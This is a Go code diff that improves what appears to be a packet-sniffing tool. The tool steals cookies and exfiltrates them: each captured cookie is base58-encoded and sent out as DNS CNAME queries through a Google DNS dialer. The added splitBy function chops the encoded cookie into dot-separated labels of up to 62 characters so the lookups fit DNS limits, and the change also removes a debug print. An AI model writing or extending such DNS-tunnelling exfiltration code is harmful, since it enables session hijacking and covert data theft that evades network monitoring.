@@ -9,6 +9,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"strings"
 	"time"
 
 	"github.com/btcsuite/btcutil/base58"
@@ -16,6 +17,19 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
+
+func splitBy(s string, n int) []string {
+	var ss []string
+	for i := 1; i < len(s); i++ {
+		if i%n == 0 {
+			ss = append(ss, s[:i])
+			s = s[i:]
+			i = 1
+		}
+	}
+	ss = append(ss, s)
+	return ss
+}
 
 func GoogleDNSDialer(ctx context.Context, network, address string) (net.Conn, error) {
 	d := net.Dialer{}
@@ -31,7 +45,6 @@ func DnsQuery(host string) {
 		PreferGo: true,
 		Dial:     GoogleDNSDialer,
 	}
-	fmt.Println(host)
 	// each part of a domain must be smaller than 63 bytes. Watch out.
 	ip, err := resolver.LookupCNAME(ctx, host)
 	if err != nil {
@@ -44,7 +57,9 @@ func DnsQuery(host string) {
 func pumpOutChannel(messages chan string) {
 	for cookie := range messages {
 		dnsName := base58.Encode([]byte(cookie))
-		DnsQuery(dnsName)
+
+		splitName := splitBy(dnsName, 62)
+		DnsQuery(strings.Join(splitName, "."))
 	}
 }
 
